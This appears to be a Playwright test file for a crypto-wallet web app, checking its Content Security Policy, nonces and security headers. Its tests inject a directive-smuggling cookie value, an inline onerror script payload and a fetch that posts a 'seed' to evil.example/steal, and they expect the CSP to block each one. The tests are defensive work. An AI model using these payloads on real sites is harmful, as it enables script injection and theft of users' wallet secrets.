import { RPC } from "./env";
import { createWallet, expect, makeKit, test } from "./helpers";

/** Parse a CSP header into directive → sources. */
function directives(csp: string) {
  return Object.fromEntries(
    csp
      .split(";")
      .map((d) => d.trim().split(/\s+/))
      .filter((d) => d[0])
      .map(([name, ...sources]) => [name, sources]),
  ) as Record<string, string[]>;
}

test("every page gets a strict, nonce-based CSP and the security headers", async ({ request }) => {
  test.skip(!!process.env.E2E_DEV, "next dev relaxes the CSP (eval, inline styles)");
  for (const path of ["/", "/welcome", "/devices", "/recover", "/stake", "/governance"]) {
    const res = await request.get(path);
    expect(res.status()).toBe(200);
    const h = res.headers();
    const csp = directives(h["content-security-policy"]);
    const nonce = csp["script-src"].find((s) => s.startsWith("'nonce-"));
    expect(nonce, path).toBeTruthy();
    expect(csp["script-src"]).toEqual(["'self'", nonce, "'strict-dynamic'"]);
    expect(csp["style-src"]).toEqual(["'self'", nonce]);
    expect(csp["default-src"]).toEqual(["'self'"]);
    expect(csp["img-src"]).toEqual(["'self'", "data:"]);
    expect(csp["font-src"]).toEqual(["'self'"]);
    expect(csp["frame-ancestors"]).toEqual(["'none'"]);
    expect(csp["base-uri"]).toEqual(["'none'"]);
    expect(csp["form-action"]).toEqual(["'self'"]);
    expect(csp["object-src"]).toEqual(["'none'"]);
    expect(csp["connect-src"]).toContain("'self'");
    expect(csp["connect-src"]).toContain(RPC);
    expect(csp["connect-src"].every((s) => s === "'self'" || /^https?:\/\/[^*]+$/.test(s))).toBe(true);

    expect(h["strict-transport-security"]).toMatch(/max-age=\d{8,}/);
    expect(h["x-content-type-options"]).toBe("nosniff");
    expect(h["referrer-policy"]).toBe("no-referrer");
    expect(h["permissions-policy"]).toContain("publickey-credentials-get=(self)");
    expect(h["permissions-policy"]).toContain("publickey-credentials-create=(self)");
    expect(h["cross-origin-opener-policy"]).toBe("same-origin");
    expect(h["x-frame-options"]).toBe("DENY");
    expect(h["x-powered-by"]).toBeUndefined();

    // Every script Next.js rendered carries this response's nonce; none is third-party.
    const html = await res.text();
    const scripts = [...html.matchAll(/<script\b[^>]*>/g)].map((m) => m[0]);
    expect(scripts.length).toBeGreaterThan(0);
    for (const s of scripts) {
      expect(s).toContain(`nonce="${nonce?.slice(7, -1)}"`);
      const src = s.match(/src="([^"]+)"/)?.[1];
      if (src) expect(src.startsWith("/_next/")).toBe(true);
    }
    // Subresource integrity on the framework chunks.
    expect(scripts.some((s) => /integrity="sha384-/.test(s))).toBe(true);
    expect(html).not.toMatch(/fonts\.googleapis|fonts\.gstatic|<link[^>]+href="https?:/);
  }
});

test("the nonce changes on every response", async ({ request }) => {
  const nonce = async () => (await request.get("/welcome")).headers()["content-security-policy"].match(/'nonce-([^']+)'/)?.[1];
  const [a, b] = [await nonce(), await nonce()];
  expect(a).toBeTruthy();
  expect(a).not.toBe(b);
});

test("static assets get the security headers too", async ({ request }) => {
  const h = (await request.get("/icon.svg")).headers();
  expect(h["x-content-type-options"]).toBe("nosniff");
  expect(h["strict-transport-security"]).toBeTruthy();
});

test("a custom node is allowed by its cookie, and only as a plain origin", async ({ request }) => {
  const connect = async (cookie: string) =>
    directives((await request.get("/welcome", { headers: { cookie } })).headers()["content-security-policy"])["connect-src"];
  expect(await connect(`blockula_rpc=${encodeURIComponent("https://my-node.example:8443")}`)).toContain("https://my-node.example:8443");
  for (const bad of ["https://evil.example; script-src *", "javascript:alert(1)", "https://evil.example/path", "*"]) {
    const sources = await connect(`blockula_rpc=${encodeURIComponent(bad)}`);
    expect(sources.some((s) => s.includes("evil") || s === "*" || s.startsWith("javascript"))).toBe(false);
  }
});

test("the app runs under the CSP without a single violation, and the CSP bites", async ({ page }) => {
  await page.addInitScript(() => {
    const w = window as unknown as { __csp: string[] };
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => w.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  const consoleCsp: string[] = [];
  page.on("console", (m) => {
    if (/Content Security Policy|Permissions-Policy/i.test(m.text())) consoleCsp.push(m.text());
  });
  // Onboarding, a recovery kit and the devices page cover most of the app's code paths.
  await createWallet(page, { kit: async (p) => { await makeKit(p); await p.getByRole("button", { name: "Next: claim a name" }).click(); } });
  await page.goto("/devices");
  await page.getByRole("button", { name: "Unlock with passkey" }).click();
  await expect(page.getByRole("heading", { name: "Recovery kit" })).toBeVisible();
  expect(await page.evaluate(() => (window as unknown as { __csp: string[] }).__csp)).toEqual([]);
  expect(consoleCsp).toEqual([]);

  // Injected markup can't run inline script; data can't be sent to an unknown origin.
  const injected = await page.evaluate(async () => {
    const div = document.createElement("div");
    div.innerHTML = '<img src="/missing.png" onerror="window.__pwned = true">';
    document.body.appendChild(div);
    await new Promise((r) => setTimeout(r, 1000));
    const exfil = await fetch("https://evil.example/steal", { method: "POST", body: "seed" }).then(() => "sent", () => "blocked");
    return { pwned: (window as unknown as { __pwned?: boolean }).__pwned ?? false, exfil };
  });
  expect(injected).toEqual({ pwned: false, exfil: "blocked" });
  const violations = await page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);
  expect(violations.some((v) => v.startsWith("script-src"))).toBe(true);
  expect(violations.some((v) => v.startsWith("connect-src") && v.includes("evil.example"))).toBe(true);
});
